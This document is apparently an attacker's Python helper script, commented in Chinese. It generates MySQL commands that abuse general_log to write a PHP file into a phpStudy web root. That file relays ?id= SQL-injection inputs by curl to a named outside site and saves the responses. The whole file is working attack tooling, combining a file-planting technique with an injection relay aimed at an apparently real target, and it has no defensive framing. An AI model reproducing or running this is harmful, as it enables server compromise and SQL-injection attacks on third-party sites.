#!/usr/bin/env python3
"""gen_yj_out.py - 生成yj_out.php (SQLi结果写文件,避免日志污染)
?id=注入 → 结果写到C:/phpStudy/WWW/yj_result.txt
"""
body = '<?php $id=$_GET["id"];$ch=curl_init("http://yijingweb.com/webmall/detail.php?id=".$id);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);file_put_contents("C:/phpStudy/WWW/yj_result.txt",$r);echo "WROTE:".strlen($r);?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/yj_out.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/yj_out.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
